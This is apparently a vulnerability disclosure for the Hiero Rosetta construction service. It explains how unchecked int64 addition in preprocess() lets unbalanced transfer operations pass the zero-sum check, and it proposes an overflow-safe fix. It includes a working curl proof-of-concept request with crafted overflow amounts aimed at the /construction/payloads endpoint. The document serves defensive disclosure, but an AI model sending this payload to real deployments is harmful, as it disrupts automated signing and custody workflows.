### Title
Integer Overflow in `preprocess()` Bypasses `ErrInvalidOperationsTotalAmount` Check, Allowing Construction of Unbalanced Transfer Transactions

### Summary
In `rosetta/app/services/construction/crypto_transfer_transaction_constructor.go`, the `preprocess()` function accumulates per-currency transfer totals using unchecked `int64` addition. Go silently wraps on integer overflow, so a crafted set of operations whose amounts are individually valid but whose mathematical sum is a non-zero multiple of 2^64 will produce a wrapped sum of exactly `0`, passing the `totalAmount != 0` guard and allowing `Construct()` to build a `TransferTransaction` whose actual encoded amounts do not sum to zero.

### Finding Description

**Exact code location:** [1](#0-0) 

```go
totalAmounts := make(map[string]int64)          // line 130
...
totalAmounts[amount.GetSymbol()] += amount.GetValue()  // line 150 — no overflow guard
...
for symbol, totalAmount := range totalAmounts {
    if totalAmount != 0 {                        // line 154 — only checks wrapped result
        return nil, nil, errors.ErrInvalidOperationsTotalAmount
    }
}
```

**Root cause:** `totalAmounts[symbol] += amount.GetValue()` is plain `int64` arithmetic. Go's specification guarantees silent two's-complement wrap-around on overflow; no panic, no error. The subsequent `!= 0` test operates on the *wrapped* value, not the mathematical sum.

**Individual amount parsing** accepts the full `int64` range with no tighter bound: [2](#0-1) 

`tools.ToInt64` calls `strconv.ParseInt(value, 10, 64)`, so any value in `[math.MinInt64, math.MaxInt64]` is accepted per-operation.

**Exploit flow:**

Craft four operations whose mathematical sum equals `2^64` (the smallest non-zero multiple of `2^64` reachable with `int64` values):

| Op | Account | Amount (tinybars) |
|----|---------|-------------------|
| 1  | A (sender) | `-9223372036854775805` (`-(2^63 - 3)`) |
| 2  | B (receiver) | `+9223372036854775807` (`math.MaxInt64`) |
| 3  | C (receiver) | `+9223372036854775807` (`math.MaxInt64`) |
| 4  | D (receiver) | `+9223372036854775807` (`math.MaxInt64`) |

Step-by-step `int64` accumulation:
```
0 + (-9223372036854775805) = -9223372036854775805
-9223372036854775805 + 9223372036854775807 = 2
2 + 9223372036854775807 = 9223372036854775809 → wraps → -9223372036854775807
-9223372036854775807 + 9223372036854775807 = 0  ✓ check passes
```

Mathematical sum: `-(2^63-3) + 3*(2^63-1) = 2^64 ≠ 0`.

`preprocess()` returns successfully. `Construct()` then calls: [3](#0-2) 

```go
transaction.AddHbarTransfer(transfer.account, hiero.HbarFromTinybar(amount.Value))
```

The SDK receives the *original* unbalanced amounts. `transactionFreeze` does not re-validate the sum: [4](#0-3) 

The frozen, serialised transaction is returned to the caller with the unbalanced amounts encoded in the protobuf body.

### Impact Explanation

The Rosetta construction layer's sole arithmetic guard (`ErrInvalidOperationsTotalAmount`) is defeated without any privilege. The `/construction/payloads` endpoint returns a signed-ready transaction whose encoded HBAR transfers do not sum to zero — directly contradicting what the validation step asserted. Any downstream system (automated signing pipeline, hardware wallet integration, exchange custody system) that trusts the Rosetta layer's "validated" response will sign and attempt to submit a transaction that the Hedera network will reject with `INVALID_ACCOUNT_AMOUNTS`. While the network backstop prevents actual fund theft, the rosetta layer's integrity guarantee is broken: it certifies a transaction as balanced when it is not. This can be used to disrupt automated workflows, exhaust transaction fees on the submitting account, and undermine the trust model of the Rosetta API.

### Likelihood Explanation

No authentication or privilege is required. The attacker only needs to call the public `/construction/payloads` HTTP endpoint with a crafted JSON body. The arithmetic is deterministic and reproducible. Any external user who can reach the rosetta endpoint can trigger this on every request.

### Recommendation

Replace the unchecked accumulation with overflow-safe addition. Before adding, check whether the result would overflow:

```go
// safe addition helper
func addInt64Safe(a, b int64) (int64, error) {
    if b > 0 && a > math.MaxInt64-b {
        return 0, errors.New("int64 overflow")
    }
    if b < 0 && a < math.MinInt64-b {
        return 0, errors.New("int64 underflow")
    }
    return a + b, nil
}
```

Use it at line 150:

```go
newTotal, err := addInt64Safe(totalAmounts[amount.GetSymbol()], amount.GetValue())
if err != nil {
    return nil, nil, errors.ErrInvalidOperationsTotalAmount
}
totalAmounts[amount.GetSymbol()] = newTotal
```

Alternatively, accumulate in `*big.Int` and compare to zero at the end, which eliminates the overflow class entirely.

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Hiero","network":"testnet"},
    "operations": [
      {
        "operation_identifier": {"index": 0},
        "type": "CRYPTOTRANSFER",
        "account": {"address": "0.0.100"},
        "amount": {"value": "-9223372036854775805", "currency": {"symbol":"HBAR","decimals":8}}
      },
      {
        "operation_identifier": {"index": 1},
        "type": "CRYPTOTRANSFER",
        "account": {"address": "0.0.200"},
        "amount": {"value": "9223372036854775807", "currency": {"symbol":"HBAR","decimals":8}}
      },
      {
        "operation_identifier": {"index": 2},
        "type": "CRYPTOTRANSFER",
        "account": {"address": "0.0.300"},
        "amount": {"value": "9223372036854775807", "currency": {"symbol":"HBAR","decimals":8}}
      },
      {
        "operation_identifier": {"index": 3},
        "type": "CRYPTOTRANSFER",
        "account": {"address": "0.0.400"},
        "amount": {"value": "9223372036854775807", "currency": {"symbol":"HBAR","decimals":8}}
      }
    ],
    "metadata": {
      "node_account_id": "0.0.3",
      "valid_until_nanos": "<now+180s_in_nanos>"
    }
  }'
```

Expected (correct) behaviour: `{"code":105,...}` (`ErrInvalidOperationsTotalAmount`).  
Actual behaviour: HTTP 200 with a valid-looking `unsigned_transaction` hex whose protobuf body encodes transfers summing to `2^64` tinybars, not zero.

### Citations

**File:** rosetta/app/services/construction/crypto_transfer_transaction_constructor.go (L44-49)
```go
	for _, transfer := range transfers {
		switch amount := transfer.amount.(type) {
		case *types.HbarAmount:
			transaction.AddHbarTransfer(transfer.account, hiero.HbarFromTinybar(amount.Value))
		}
	}
```

**File:** rosetta/app/services/construction/crypto_transfer_transaction_constructor.go (L130-158)
```go
	totalAmounts := make(map[string]int64)
	transfers := make([]transfer, 0, len(operations))

	for _, operation := range operations {
		accountId := operation.AccountId
		amount := operation.Amount
		if amount.GetValue() == 0 {
			return nil, nil, errors.ErrInvalidOperationsAmount
		}

		sdkAccountId, err := accountId.ToSdkAccountId()
		if err != nil {
			return nil, nil, errors.ErrInvalidAccount
		}
		transfers = append(transfers, transfer{account: sdkAccountId, amount: amount})

		if amount.GetValue() < 0 {
			senderMap[accountId.String()] = accountId
		}

		totalAmounts[amount.GetSymbol()] += amount.GetValue()
	}

	for symbol, totalAmount := range totalAmounts {
		if totalAmount != 0 {
			log.Errorf("Transfer sum for symbol %s is not 0", symbol)
			return nil, nil, errors.ErrInvalidOperationsTotalAmount
		}
	}
```

**File:** rosetta/app/domain/types/amount.go (L55-59)
```go
func NewAmount(amount *types.Amount) (Amount, *types.Error) {
	value, err := tools.ToInt64(amount.Value)
	if err != nil {
		return nil, errors.ErrInvalidOperationsAmount
	}
```

**File:** rosetta/app/services/construction_service.go (L758-764)
```go
func transactionFreeze(transaction hiero.TransactionInterface) *rTypes.Error {
	if _, err := hiero.TransactionFreezeWith(transaction, nil); err != nil {
		log.Errorf("Failed to freeze transaction: %s", err)
		return errors.ErrTransactionFreezeFailed
	}

	return nil
```
